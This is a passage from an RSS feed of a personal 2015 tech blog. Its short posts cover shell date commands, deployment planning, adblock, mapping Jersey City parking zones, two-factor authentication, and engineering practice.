   <link href="http://dangoldin.com/2015/10/19/dates-in-the-shell/"/>
   <updated>2015-10-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/19/dates-in-the-shell</id>
   <content:encoded><![CDATA[
<p>The longer I code the more I appreciate the power of the shell. Getting familiar with common commands is a great way to improve your productivity and over time you amass a massive collection of scripts that allow you to do nearly everything. The most recent utility I discovered was “date”. As expected, it displays the current date and time but it can easily be adapted to display the current datetime in nearly any date format but also allows you to offset the current date in a variety of ways.</p>

<figure class="highlight"><pre><code class="language-sh" data-lang="sh">➜  ~  <span class="nb">date
</span>Mon Oct 19 22:35:37 EDT 2015
➜  ~  <span class="nb">date</span> +%Y-%m-%d
2015-10-19
➜  ~  <span class="nb">date</span> +<span class="s2">"'%Y-%m-%d'"</span>
<span class="s1">'2015-10-19'</span>
➜  ~  <span class="nb">date</span> <span class="nt">-v</span>+3d +%Y-%m-%d
2015-10-22
➜  ~  <span class="nb">date</span> <span class="nt">-v-3d</span> +%Y-%m-%d
2015-10-16
➜  ~  <span class="nb">date</span> <span class="nt">-v-3y</span> +%Y-%m-%d
2012-10-19
➜  ~  <span class="nb">date</span> <span class="nt">-v</span>+3y +%Y-%m-%d
2018-10-19
➜  ~  <span class="nb">date</span> <span class="nt">-v</span>+3y +<span class="s2">"%Y-%m-%dT%H:%M:%S"</span>
2018-10-19T22:39:18
➜  ~  <span class="nb">date</span> <span class="nt">-v</span>+3m +<span class="s2">"%Y-%m-%dT%H:%M:%S"</span>
2016-01-19T22:39:24</code></pre></figure>

<p>In the past I’d resort to a JavaScript utility or a quick Python script when I needed a simple date calculation but lately I’ve been able to do nearly everything solely by using the built in date utility. It’s still a bit cumbersome for generating date ranges or when requiring complicated logic but for the basic stuff it’s surprisingly powerful and expressive. It’s amazing how full featured the shell is and how often we avoid it and use more fleshed out languages. Instead of trying to find new languages it’s worth taking the time to actually explore and understand the shell - it’s one of the better investments an engineer can make.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Writing code? Think about the deployment</title>
   <link href="http://dangoldin.com/2015/10/18/writing-code-think-about-the-deployment/"/>
   <updated>2015-10-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/18/writing-code-think-about-the-deployment</id>
   <content:encoded><![CDATA[
<p>The goal of every bit of code should be to make it to production. Code that’s not deployed is wasted effort as well as a loss to the business. And a big part of making sure code is deployed is thinking through the deployment plan as we write the code. Some code is deployed simply by pushing the new application while other code may require updating the database schema. More complex code may depend on other applications which will need to be tweaked and deployed beforehand. Large companies and teams have dedicated ops teams that handle deployments but small teams need to do this on their own.</p>

<p>Thinking through the deployment also leads to better code. By going through the steps of how the deploy will work you end up breaking your code down into a series of changes that end up being significantly safer and reduce the risk of a large failure. For example, we may want to write an update that will add an additional feature to our application based on a flag in a database. A safe way of doing it is to create a new column first that will have no effect on the existing application and then roll out our the new code that starts using this column. Future releases can then remove the code that uses legacy columns with latter releases dropping those columns entirely. None of this is shocking news but it’s surprising how rarely we think about deployments when we set out to write code. Especially as a team grows it’s important for everyone to be thinking about the way their code will work and the way it needs to be deployed.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Adblock, publishers, and content quality</title>
   <link href="http://dangoldin.com/2015/10/15/adblock-publishers-and-content-quality/"/>
   <updated>2015-10-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/15/adblock-publishers-and-content-quality</id>
   <content:encoded><![CDATA[
<p>Ever since the release of iOS 9 and it’s support for adblocking apps I can’t go a day without seeing some article about adblock. Some condemn it and claim it’s stealing from publishers while others make the case that ads are so intrusive that they deserve to be blocked. I don’t want to dwell into either of these but something that’s been on my mind is that publishers aren’t doing enough to differentiate themselves based on the quality of their audience.</p>

<p>Top tier publishers that have unique and high quality content should focus on building a community. This passionate group of users will engage with the content on the site as well as provide valuable information to the publisher. By signing up for an account users provide valuable demographic information as well as interests based on what they see and what they do. This is also something that adblock won’t be able to easily block since it will be such a core part of the experience and hosted on the publisher’s own domain.</p>

<p>It’s true that publishers with low quality or commodity content will suffer as users move on to something with a better experience but this will arguably make the web a better place. The fact that some people even run adblock implies they have no respect for the publisher’s effort - and pursuing a lowbrow approach just turns that into a death spiral.</p>

<p>Disclosure: I work at TripleLift which provides a much better advertising experience for users, publishers, and advertisers.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Have a 'go to' project when learning a new programming language</title>
   <link href="http://dangoldin.com/2015/10/11/have-a-go-to-project-when-learning-a-new-programming-language/"/>
   <updated>2015-10-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/11/have-a-go-to-project-when-learning-a-new-programming-language</id>
   <content:encoded><![CDATA[
<p>At the beginning of the year I wanted to learn a bit of Node.js and decided the best way was to code up a simple project. The idea was <a href="http://jsonify.me/" target="_blank">jsonify.me</a>, a simple API only app that provided people a simple way to generate their own JSON profiles that they would then be able to map to any domain name, for example <a href="http://json.dangoldin.com" target="_blank">http://json.dangoldin.com</a>. The primary goal was to get some real experience with Node.js rather than rely on some walkthroughs and tutorials. Since then I’ve used it as the starter project to learn new languages. I’ve coded it up in Scala and have just finished up the Go version.</p>

<p>The project has a few nice properties that force me to gain a pretty good understanding of the language and how a typical project plays out. Despite being a pretty simple program it touches a bunch of modern web components. The code needs to be able to parse and modify HTTP requests and headers in order to support redirection and authentication. In addition, the code comes with a working LinkedIn OAuth example and gives an opportunity to incorporate an OAuth library. The other big thing is integrating the AWS S3 client library which provides a simple way to get exposure to the AWS ecosystem.</p>

<p>Everyone who’s learning new languages should have a “go to” project. It’s okay to go through a series of tutorials to get the basics of a language but nothing beats working on a project you’ve already done across a variety of other languages. In addition to coding up a project in a new language you get a feel for the way the program is structured and laid out. Over time you start getting an intuitive feel for how one language works compared to another and can understand the tradeoffs between them. Having your own project also allows you to optimize towards the skills you want to learn - in my case I wanted them to be focused on the web and allow me to work with the various HTTP elements as well as a few third party libraries. Tutorials and walkthroughs are great to get a feel for the language but they don’t force you to think through the design or architecture which are critical when working on larger projects. It’s amazing how much effort that takes up when learning a new language and the only way to learn it is to experience the frustration of doing it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Not every big company is evil</title>
   <link href="http://dangoldin.com/2015/10/10/not-every-big-company-is-evil/"/>
   <updated>2015-10-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/10/not-every-big-company-is-evil</id>
   <content:encoded><![CDATA[
<p>It’s become a popular idea that big companies are evil and we should only be supporting small and local businesses. There’s some truth to it - smaller companies are much more aligned with the incentives of the community whereas larger companies may be managed from thousands of miles away via a spreadsheet. When the only goal is to make more money it’s very likely that morality and honesty will suffer.</p>

<p>At the same time, we should differentiate evil companies from evil actions. Even Walmart has done some good. A story that comes to mind is the reduction in the size of <a href="http://www.wsj.com/articles/SB117970493855109027" target="_blank">detergent bottles</a>. There was an arms race by detergent manufacturers that were diluting their detergent in order to sell large bottles for the same price. Sure, it cost more to produce the larger bottles, but then they’d be able to generate significantly more sales when people saw that you were offering “twice” the volume at the same price as your competitors. Sure enough competitors followed suit and we ended up with a <a href="https://en.wikipedia.org/wiki/Prisoner%27s_dilemma" target="_blank">Prisoner’s Dilemma</a> spiral. It took Walmart, along with a few other large retailers, to reverse the trend and get the manufacturers to start producing bottles in smaller, more concentrated sizes.</p>

<p>And on the other extreme there’s Starbucks. Despite not being a trendy new coffee shop they have the size and resources to launch massive initiatives. One of the recent ones is a way for current employees to get a <a href="http://www.starbucks.com/careers/college-plan" target="_blank">full cost covered college degree</a> from Arizona State University. Despite this being isolated to a single college and only classes no local coffee shop would be able to make this happen. And the cynic may see this as a marketing ploy but if it’s still able to help more people get a degree I’m all for it.</p>

<p>In both of these cases the benefits came from the size of the company. Larger companies have both the resources and the clout to push change that may not have been possible by smaller company. Instead of dismissing them as permanently broken we should be focused on getting them to use their clout and money for societal gain.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Is media consumption zero sum?</title>
   <link href="http://dangoldin.com/2015/10/04/is-media-consumption-zero-sum/"/>
   <updated>2015-10-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/10/04/is-media-consumption-zero-sum</id>
   <content:encoded><![CDATA[
<p>I’ve seen the point made across a variety of articles that media companies see media consumption as being zero sum - there’s only a fixed amount of consumption that people have and they’re allocating it between a variety of options. The typical example is people abandoning legacy television for YouTube. Thus, the rationale goes, the time people would have spent watching television has been replaced by them watching YouTube.</p>

<p>I understand the concern. People are watching less and less standard television with only time sensitive and restricted content (ie sports) being viewed on television but there’s a world of nuance. People may be watching less and less broadcast television but the content that’s being consumed is growing. Cordcutters pride themselves on not paying for cable television yet they’re still subscribing to Netflix and Hulu. The same shows are being watched - just not on the usual devices. In addition, there’s the rise of multi-screen consumption - we’ll be on our phones or laptops while watching TV. Whether it’s a distraction from a commercial, a way to follow an event on Twitter, or just browsing Wikipedia to get a bit more information, we’re parallelizing our media consumption and increasing the size of the media pie rather than solely switching between platforms.</p>

<p>I found the following graphic which highlights the shift in media consumption over the past century.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/global-media-consumption-per-week-by-medium.jpg" alt="Global media consumption per week by medium" width="585" height="329" layout="responsive"/>
      <p class="center"><a href="https://thebrandbuilder.wordpress.com/2012/03/12/strategy-reminder-shifts-in-global-media-consumption/">The BrandBuilder Blog</a></p>
    </div>
  </li>
</ul>

<p>Part has been the rise of new technology to fill in more and more of our days. Radio gave way to the rise of television which started taking up more and more of our time. The internet then came along and gave us another way to access and consume content that. The smartphone blew that out of the water and gave us the internet and media consumption wherever we are. Whereas in the past we’d be watching TV or using the internet at home or at the office with smartphones we can consume content wherever we are. The pie of “total available media consumption minutes” has been growing over time and will only keep increasing. What will people do when we’re being chauffeured around by our self-driving cars? We’ll be using our future devices to consume and entertain ourselves the exact same way we do now. That’s a whole new timeslot for us to consume content that we’ve never had the ability to before.</p>

<p>As more and more of our responsibilities get automated that time will become available. Some will fill it in with creative pursuits while others will view it as another timeslot for media consumption on an ever increasing number of screens and devices. It’s definitely depressing but I’m not optimistic given recent trends.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The iPad Pro and Apple's walled garden</title>
   <link href="http://dangoldin.com/2015/09/26/the-ipad-pro-and-apples-walled-garden/"/>
   <updated>2015-09-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/09/26/the-ipad-pro-and-apples-walled-garden</id>
   <content:encoded><![CDATA[
<p>Supposedly the performance of the recently announced iPad Pro will rival that of the Macbook and encourage tons of people to buy it with productivity in mind rather than just consumption. And at a starting price of $799 it’s significantly cheaper than the Apple laptop options. Apple is known for achieving large product margins but I wonder if the iPad Pro is sold at a lower margin to get people to switch to iOS and get even more tied to Apple’s ecosystem. I currently use a Macbook Pro for my work but can switch to any Unix based environment without any hit to my productivity. I’m not sure if this is me being too cynical but I can definitely see Apple taking a long term view here and taking a much lower profit margin on the iPad Pro in order to get people to actually make the switch to the walled garden of iOS. Among the developer community Safari is already seen as the <a href="http://nolanlawson.com/2015/06/30/safari-is-the-new-ie/" target="_blank">reincarnation of IE</a> given Apple’s lackluster support. These may just be coincidences but for a company as detail oriented as Apple this feels like a strategic decision to shift away from the open web and into the walled app garden.</p>

<p>During the 90s Apple nearly failed due to the dominant Windows ecosystem and Windows’ ability to run on commodity hardware. At least for now, mobile isn’t at the commodity hardware stage and Apple has taken the lead in smartphone hardware. This position allows Apple to impose its ecosystem and software but I wonder what happens if smartphone hardware get commoditized - similar to what happened to PCs in the 80s and 90s.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mapping the Jersey City parking zones II</title>
   <link href="http://dangoldin.com/2015/09/24/mapping-the-jersey-city-parking-zones-ii/"/>
   <updated>2015-09-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/09/24/mapping-the-jersey-city-parking-zones-ii</id>
   <content:encoded><![CDATA[
<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/jersey-city-parking-zones.png" alt="Jersey City parking zones" width="442" height="640" layout="responsive"/>
    </div>
  </li>
</ul>

<p>I finally had the chance to finish up the Jersey City parking zone mapping project from a couple of weeks ago. The goal was to take a PDF of valid addresses for each zone and visualize it on a map. The result can be found at <a href="https://dangoldin.github.io/jersey-city-open-data/">https://dangoldin.github.io/jersey-city-open-data/</a> and includes the zones that had enough geocodeable addresses to generate a valid polygon.</p>

<p>As expected, most of the work was going from the PDF to a set of valid geocoded addresses. The biggest challenge was extracting the text from the PDF and transforming them into addresses that could be accurately geocoded. Once I had that it was simply modifying the Google Maps <a href="https://developers.google.com/maps/documentation/javascript/examples/polygon-simple" target="_blank">polygon example</a> to generate a list of polygon and finding a library to overlay the zone labels.</p>

<p>The two things I want to change are to modify the visualization to also include a street level visualization rather than relying on a polygon since it’ll make the information bit more useful as well as incorporate the street cleaning hours. If anyone has that data I’d love to get it.</p>

<p>As usual, the code is up on <a href="https://github.com/dangoldin/jersey-city-open-data" target="_blank">GitHub</a> and pull requests are welcome.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Keep on learning</title>
   <link href="http://dangoldin.com/2015/09/20/keep-on-learning/"/>
   <updated>2015-09-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/09/20/keep-on-learning</id>
   <content:encoded><![CDATA[
<p>I’m a strong believer that one needs to keep learning and to not get content with the knowledge they have. This can come in the form of new experiences or challenges but should be seen as a learning opportunity. Throughout school we have a structure in place to help us learn but after we graduate we have to take the responsibility ourselves. Unfortunately, many people don’t and even take pride that they haven’t read a book since college.</p>

<p>As more and more of the rote work becomes automated it’s important to develop the creative mind set that can take topics from a variety of fields and blend them together to create something new. The irony is that our education and professional systems are becoming more and more specialized. As our knowledge of an area becomes deeper it’s harder to be a generalist and we end up focused on only a few areas and skills.</p>

<p>My solution is to read as much as a I can across a variety of fields: fiction and non-fiction, classics and modern fiction, even the occasional textbook. The goal isn’t so much to recite everything from memory as it is to plant some remnant thoughts in the back of my mind that may end up being useful in the future. It’s the difference between not knowing that there’s an answer to a question and knowing that an answer exists. The latter gives you the ability and confidence to find the answer whether the former gives you an exuse to give up. The other benefit of this cross-disciplinary approach is that you get great at identifying patterns. These act as a shortcut and make it easy to absorb new information as well as spot patterns in the wild.</p>

<p>These days it’s too easy to get our knowledge bite-sized through the various social networks, articles, and headlines but that information is fleeting. The way to really absorb information is through focus and being able to spend more than a few minutes on a particular topic. Otherwise it’s just wasted time and effort.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Internalizing externalities</title>
   <link href="http://dangoldin.com/2015/09/15/internalizing-externalities/"/>
   <updated>2015-09-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/09/15/internalizing-externalities</id>
   <content:encoded><![CDATA[
<p>Recently I’ve adopted the practice of having the engineering team support other team when the core technology can support it - even if hasn’t been fully built in to the product. This may require manually adding entries to a series of database tables that or manually pulling reports that aren’t yet availabe via the UI. Despite being an inefficiency for the engineering team it provides a variety of benefits that outweigh this minor inconvenience.</p>

<ul>
  <li>
    <p>Engineers understand the business better. By being closer to the actual use cases engineers understand how the product is used and the problems that other teams are solving. This can have huge wins in the future when there are multiple implementation options available and the developer needs to pick one. Being able to pick the right one can significnatly change the cost of doing future development work.</p>
  </li>
  <li>
    <p>Work gets done faster. Engineers love their efficiency and as soon as they end up having to do the same thing twice they’ll think of ways to automate it. This is the perfect way of shifting the problem to the person best suited to solve it. A support person may need to come up with a series of inefficient workarounds while an engineer will solve the underlying, core issue.</p>
  </li>
  <li>
    <p>Improved quality. Being closer to the actual use case will improve the quality of the code since the developer will know how their code will be used and will understand the options available. The other benefit is that it will become a lot easier to see usability issues as well as improvement opportunities that can be implemented in the future. Bugs will also get caught earlier since the developer will be more likely to monitor the behavior if they were the ones that worked on it. The fact that they used it will provide more motivation to monitor it when it’s out in production.</p>
  </li>
  <li>
    <p>Prioritization makes sense. Oftentimes it’s not obvious why one feature is prioritized over another. Being able to work through some business cases and experience user frustrations is a great way to get a look at the product from a different perspective.</p>
  </li>
  <li>
    <p>No workarounds that end up being “grandfathered” in. It’s common to see users come up with workarounds to support a use case not officially supported. This places a big burden on the engineering team that may end up needing to support it since a particular workflow now depends on it. By exposing the problem to engineers earlier it’s more likely that this situation is avoided.</p>
  </li>
</ul>

<p>Years ago I read how Kayak has their <a href="http://www.inc.com/magazine/20100201/the-way-i-work-paul-english-of-kayak.html" target="_blank">customer support phone number get routed</a> to the engineering team some percentage of the time. The goal is to expose engineers to customer problems with the idea that an engineering can actually solve a problem once it bothers them enough times. I view this as “internalizing externalities” - rather than offloading engineering costs to other teams (product managers, QA, customer support) we should address the problems as soon as they arise. This ensures the quality stays high while aligning the engineering team with the rest of the company.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Workaround driven product development</title>
   <link href="http://dangoldin.com/2015/09/13/workaround-driven-product-development/"/>
   <updated>2015-09-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/09/13/workaround-driven-product-development</id>
   <content:encoded><![CDATA[
<p>As engineers, it’s easy to get focused on technical problems and lose sight of the business. We realize our code will be used externally but we have a tendency to focus on what’s close to home rather than the actual real world usage. One of the biggest eye openers for me has been seeing people interact with our products.</p>

<p>We like to think of ourselves as “hackers” but it’s amazing to see the length people go to “hack” our products to do what they want. Whether it’s someone keeping multiple tabs open to be able to reference information back and forth and avoid losing data or someone registering multiple accounts to bypass a database uniquness constraint - it’s a way for people to bypass the intended design and I’d argue that these “hackers” are a sign of a useful product. In fact, I’d argue that if people aren’t hacking around a product’s limitations it’s not a good one. These workarounds are a sign that the product is so useful that people are willing to go through additional manual effort to use it for a different use case. If that’s not a sign of new functionality to support I don’t know what is.</p>

<p>And the best way to understand these workarounds is to talk to our customers and collect as much information as we can. Guessing people’s intentions isn’t helpful but being able to identify an anomalyous flow and then talking to that person is a great way to understand the intention and the workaround. This insight can then help drive product direction and innovation.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mapping the Jersey City parking zones</title>
   <link href="http://dangoldin.com/2015/09/12/mapping-the-jersey-city-parking-zones/"/>
   <updated>2015-09-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/09/12/mapping-the-jersey-city-parking-zones</id>
   <content:encoded><![CDATA[
<p>A big part of owning a car in Jersey City is dealing with the street parking. Unfortunately, Jersey City does not make it easy to see what the zones are - instead there’s a <a href="http://jcparking.org/PDF/ZONE%20PERMITS%20ALL%20ZONES.pdf" target="_blank">PDF</a> that lists the streets and address ranges that are part of each zone. After getting frustrated with this annoyance for too long I decided to just take matters into my own hands and visualize the zones through some scripting. This is a relatively simple project that still involved some false steps so I wanted to document the process and provide a peek into my development approach.</p>

<p>The first step was extracting the address ranges from the PDF into something more digestible by a program. I tried using a PDF converter but that ended up mashing up the addresses together so I took a step back and came up with a very simple script that took copy and pasted text from the PDF and cleaned it up into a list of addresses.</p>

<p>To do a quick proof of concept I started with a single zone for now and see whether I could get it visualized the way I wanted to using Google Maps. After converting the address range into a starting and end address I attempted to use the Google Maps API to do the geocoding (going from an address to a latitude/longitude). Unfortunately, due to the volume of addresses I wanted geocoded I quickly hit the rate limit cap. I introduced a throttle between calls but that ended up causing the page to take too long to load.</p>

<p>Even then, the geocoding wasn’t 100% accurate and I needed to figure out how to visualize the resulting zones from a set of coordinates. The first visualization atttempt was to just connect the coordinates with a series of lines but as expected that led to just a jumbling of lines. As a quick fix I sorted the coordinates clockwise by figuring out the center of the coordinates, converting each coordinate as an angle from the center, and then sorting the resulting points by angle. This led to a “starburst” shape that was neater but still didn’t represent the actual zone.</p>

<p>It’s not done just yet and I’m working on two improvements - one is moving the actual geocoding work to an offline script so I don’t have to deal with the rate limiting issue and two is using a convex hull algorithm to come up with a polygon that encapsulates each of the addresses in a zone that should improve the visualization. Feel free to follow along on <a href="https://github.com/dangoldin/jersey-city-open-data" target="_blank">GitHub</a> and offer any feedback, suggestions, or even a pull request.</p>

<p>Writing good code on the first try is tough and part of the process is attempting an approach that may require backtracking. The challenge is realizing when something isn’t working and being able to take a step back and revisit the actual goals and understand the constraints. Some projects do end up perfect on the first try but the vast majority require multiple iterations to get right. Experience helps us understand the constraints and tools we’re working with but as the popular saying goes: “Wisdom comes from experience. Experience comes from bad judgement.”</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Smart OSes</title>
   <link href="http://dangoldin.com/2015/09/05/smart-oses/"/>
   <updated>2015-09-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/09/05/smart-oses</id>
   <content:encoded><![CDATA[
<p>It feels as if Google has been getting better and better at what I call search inference. I’ll oftentimes do a search for a particular place on either Google Maps or the general site and see it automatically show up in Google Now. Or I will start with a simple search query that needs to be refined with Google able to offer perfect suggestions. Given how much data they’re collecting it’s not a surprise but it’s an easy way to realize I’m not that unique.</p>

<p>The fact that I can even sense improvement highlights how significant the improvements have been - gradual ones wouldn’t be as noticeable. What I want is for these innovations to become part of the OS. I currently use OS X and while it’s easy to use with a lot of neat utilities and applications it’s not smart. I constantly go back and forth between apps - referencing some notes in Sublime, writing some SQL queries, messing around with Excel - and would love the OS to be smart enough to understand my intent. The simplistic version of this is a smarter auto complete that transcends apps - rather than going back and forth between Sublime and Sequel Pro copying and pasting queries it would be nice for the OS to allow me to autocomplete fields and table names that are being actively used. The more advanced version would detect patterns in my workflows and allow me to skip numerous steps. When working on most tasks we have a mental model of how we’ll proceed - first I’ll write a query to pull this data, then I’ll dump it into Excel and run these calculations to figure out some values, then I’ll use these values to make a few updates in the database. These tasks are abstract with a lot of context locked up in our heads but I can see our computers getting smart enough to help us skip the majority of these steps. Given how often we do these trivial manipulations an intelligent OS can make us strikingly more productive.</p>

<p>Google has a huge advantage given both the massive data they have as well as controlling the entire ecosystem. This gives them the ability to know how apps fit together on a technical and behavioral level. Modern OSes separate themselves from the applications and run in isolation to the rest of the world so they don’t have Google’s key advantages. Despite this, I think it’s inevitable we’ll see these smart OSes develop - especially if we want to be as productive on our smartphones as we are on our desktops.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Come on Twitter</title>
   <link href="http://dangoldin.com/2015/09/03/come-on-twitter/"/>
   <updated>2015-09-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/09/03/come-on-twitter</id>
   <content:encoded><![CDATA[
<p>Eugene Wei <a href="http://www.eugenewei.com/blog/2015/9/1/when-the-network-is-mature" target="_blank">published a great post</a> on the power of networks and how Twitter hasn’t been taking advantage of their core product - a public messaging protocol. Given this thesis, Twitter should move away from the artificial 140 character limit and innovate on top of the protocol rather than be bound by it.</p>

<p>I’m not nearly as eloquent but I also have my gripes with Twitter that his post motivated me to write. It just feels they don’t care about the user experience. Cross device sync is still a problem - if I clear a notification on my phone why do I see it again on my computer? People are still complaining about the OS X app not being as functional as the other versions. Even on my phone the navigation feels inconsistent - sometimes I get taken out of the app and sometimes a screen is loaded inside. This causes me to hit the back button at the wrong time and randomly leave the app which resets my location. I’m a big fan of Twitter and it’s pretty much the only social network I actually use but I’m frustrated by how poor it is.</p>

<p>It feels as if Twitter has decided to focus purely on monetization rather than evolving the product. It’s okay to do this when you’re in a dominant market position (see LinkedIn) but Twitter should be focused on making sure they’re getting new users that stick around. The only way to do this is to make a product that’s useful, fun, and easy to use.</p>

<p>Disclosure: I own a bit of Twitter stock.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Two factor authentication hell</title>
   <link href="http://dangoldin.com/2015/08/31/two-factor-authentication-hell/"/>
   <updated>2015-08-31T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/31/two-factor-authentication-hell</id>
   <content:encoded><![CDATA[
<p>While my phone was being repaired I ran into a predicament. The only way I could log in to my Google accounts was by authenticating via an SMS code which I wasn’t to get without an SMS code. Additionally, I never bothered to actually write down the backup codes thinking I’d never need them so I was stuck in the envious position of being Google account free for 4 days.</p>

<p>Luckily, I had two things going on that made the loss easily manageable. One was that I shared my personal calendar with my work account so was able to see (and create) everything I needed through my work account. And two - I’ve been forwarding all of my email from Gmail to Fastmail <a href="http://dangoldin.com/2014/03/18/goodbye-gmail/">since March</a> of last year. The only real frustration was not being able to search through my email history nor use the chat. Otherwise it was barely noticeable.</p>

<p>I definitely got lucky so the lesson here is that it’s impossible to predict what’s going to happen and you should just deal with the annoyance of the backup codes. Google also provides the Authenticator app which is another way of supporting two factor authentication. None of these is as simple as just not having two factor authentication but I think it’s a must have - especially for a primary email account which is linked to every other account - including your financial and social media accounts. Losing access to your emails makes it very easy to reset the passwords on those and there’s no excuse in not enabling two factor authentication.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Game theory dining</title>
   <link href="http://dangoldin.com/2015/08/29/game-theory-dining/"/>
   <updated>2015-08-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/29/game-theory-dining</id>
   <content:encoded><![CDATA[
<p>This past Wednesday I had dinner at Blu - a restaurant that’s <a href="http://well.blogs.nytimes.com/2015/08/17/what-would-you-pay-for-this-meal/ " target="_blank">adopted</a> a “pay what you want” pricing model. Customers have an incentive to underpay the final check so I was curious to see how Blu handled it throughout dinner. I noticed three tactics they used to get people to pay fairly and am sure they utilized a bunch more that I didn’t even notice:</p>

<ul>
  <li>Anchoring: Before sitting down to eat the waitress explained that it was pay what you want and most of the dishes are estimated to be priced between $10 and $12. This sets the expectation early so if you do decide to pay less you’re making an explicit decision to underpay.</li>
  <li>Reminder: At the end of the meal we were told how many dishes we ordered. This was also helpful but I can’t help but think that this is a way to give you an estimate of how much you should pay - especially when paired with the fact that the expectation is $10 per dish - a very easy number to multiply.</li>
  <li>Shame: I found this the most interesting one. Instead of giving you a blank receipt and allowing you to write what you want to pay you have to tell the waitress what you want them to charge. This forces you to explicitly vocalize your payment to another person rather than quickly writing something and slinking away. And no one wants to be judged as cheap face to face so we’re encouraged to pay well.</li>
</ul>

<p>I’m a huge fan of behavioral psychology experiments that shed some light on the way our minds work and it was a great experience to partake in one. I only wish I could have spotted more behavioral cues that I’m sure they employed.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Learn the application architecture through AWS</title>
   <link href="http://dangoldin.com/2015/08/23/learn-the-application-architecture-through-aws/"/>
   <updated>2015-08-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/23/learn-the-application-architecture-through-aws</id>
   <content:encoded><![CDATA[
<p>Last month I <a href="http://dangoldin.com/2015/07/25/use-the-database-luke/">wrote</a> that one of the best ways to ramp us a new engineer is to start going through the database schema and understand how the various tables fit together and what the various values mean. That provides a great view around the engineering product - the various fields indicate the options and functionality available and the tables indicate how the components work together as well as what and how data is collected.</p>

<p>The flip side is that this doesn’t actually provide any view into the application architecture - what’s the hardware used? What are the applications and how do they fit together? How do the applications work? What’s the load on the various components and what’s done to address it?</p>

<p>If you’re on AWS or another cloud provider a neat way to answer these questions is to look at the relationship between the various components and the appropriate stats. For example you can start with Route 53 to see the subdomains used and what they’re mapped to. Some may be mapped to EC2 instances while others may be mapped to a ELB, S3 buckets, or Cloudfront. Each of these provides a view of how the application is used - if it’s on S3 then the application is going to be static HTML, CSS, and JavaScript but if it’s hitting a load balancer then you can expect the application to be under heavy load and be supported by multiple EC2 instances. Beyond this you can look at the amount of requests being made and the volume of data going in and out as well as whether there’s any pattern throughout a day or week. There’s a ton of monitoring tools in AWS and each provides an additional data point that provides insight into the application architecture. The various options and dashboards available highlight how important devops is for every engineer - and how valuable it is for every engineer to have at least read-only access to AWS. It’s tough to write good, scalable good unless you understand how it will be used and how it will fit in with the rest of the stack.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Development cycles across programming languages</title>
   <link href="http://dangoldin.com/2015/08/20/development-cycles-across-programming-languages/"/>
   <updated>2015-08-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/20/development-cycles-across-programming-languages</id>
   <content:encoded><![CDATA[
<p>The most common way of making sure code works is by going through the “develop-run-test” loop. We write some code that we expect to have a certain behavior, we run the code and trigger that behavior, and then we confirm that the results are what we expected. And we keep iterating, hopefully making more progress with each new iteration.</p>

<p>One thing I’ve noticed is that this pattern varies drastically for me depending on the language I’m working with. I’ll cycle through iterations much quicker in Python than I will with Java. Part of it is that my Java projects are larger and take a longer amount of time to start but I suspect the bigger benefit is that Java’s strong and static type system makes it easier to take larger coding steps than I’d be able to with Python. For example, if I need to write a method to extract data from a JSON object I’ll approach it very different if I’m doing it in Python than I would if I were doing it in Java. With Python I’d jump into the REPL and walk through a few examples and make sure I handle the the various edge cases whereas with Java I’d place a lot more faith in the IDE and it’s litany of warnings.</p>

<p>Each language comes with it’s own pros and cons and it’s impossible to find a single language that fits every use case. The goal is to pick the appropriate language for the job at hand - and this may involve starting with one and moving to another one as the problem domain changes or the team grows. The ideal language is one that’s able to maximize the product of the iteration speed as well as the step size. Taking frequent, small steps is equivalent to taking fewer, bigger steps - the aim is to maximize the resulting speed - not the individual inputs. A great language paired with a strong development environment achieves both speed and step size.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A phoneless day</title>
   <link href="http://dangoldin.com/2015/08/16/a-phoneless-day/"/>
   <updated>2015-08-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2015/08/16/a-phoneless-day</id>
   <content:encoded><![CDATA[
<p>As they say you don’t appreciate something until it’s gone and I got to experience first hand when I cracked the screen on my phone and dropped it off for a quick repair. Unfortunately, the repair wasn’t so quick due to a screw up and I’m still phoneless more than a day later.</p>

